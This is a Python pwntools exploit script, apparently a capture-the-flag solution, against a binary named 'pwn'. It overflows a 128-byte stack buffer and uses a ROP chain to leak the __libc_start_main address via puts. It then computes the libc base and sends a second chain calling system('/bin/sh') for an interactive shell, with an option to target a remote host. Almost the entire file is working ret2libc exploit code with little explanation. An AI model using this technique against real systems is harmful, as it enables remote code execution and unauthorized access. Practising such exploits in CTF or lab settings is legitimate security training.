# from pwn import * # Import pwntools

# p = process("./pwn") # start the vuln binary
# elf = ELF("./pwn") # Extract data from binary
# prompt="Is there something we could help you with while you wait?"
# rop = ROP(elf) # Find ROP gadgets

# # Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
# PUTS = elf.plt['puts']
# LIBC_START_MAIN = elf.symbols['__libc_start_main']
# POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"

# log.info("puts@plt: " + hex(PUTS))
# log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
# log.info("pop rdi gadget: " + hex(POP_RDI))

# base = "A"*128 + "B"*8 #Overflow buffer until return address
# # Create rop chain
# rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS)

# #Send our rop-chain payload
# p.sendlineafter(prompt, rop)

# #Parse leaked address
# p.recvline()
# p.recvline()
# recieved = p.recvline().strip()
# leak = u64(recieved.ljust(8, "\x00"))
# log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

# p.close()

from pwn import * # Import pwntools


os.chdir('../public')
elf = context.binary = ELF("pwn")
context.terminal = ['tilix', '-a', 'app-new-session', '-e']
gs = '''
b main
c
'''


def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        return remote(args.HOST, args.PORT)
    else:
        return process(elf.path)



# p=remote("192.168.0.18", 5556) # start the vuln binary
p=run()
elf = ELF("./pwn")# Extract data from binary
prompt="Is there something we could help you with while you wait?"

libc = ELF("../sol/libc6_2.27-3ubuntu1.4_amd64.so") #this is the local libc 
rop = ROP(elf)# Find ROP gadgets

PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

#Overflow buffer until return address
base = "A"*128 + "B"*8
# Create rop chain
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(MAIN)

#Send our rop-chain payload
p.sendlineafter(prompt, rop)

#Parse leaked address
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search("/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

p.sendlineafter(prompt, rop2)


p.interactive()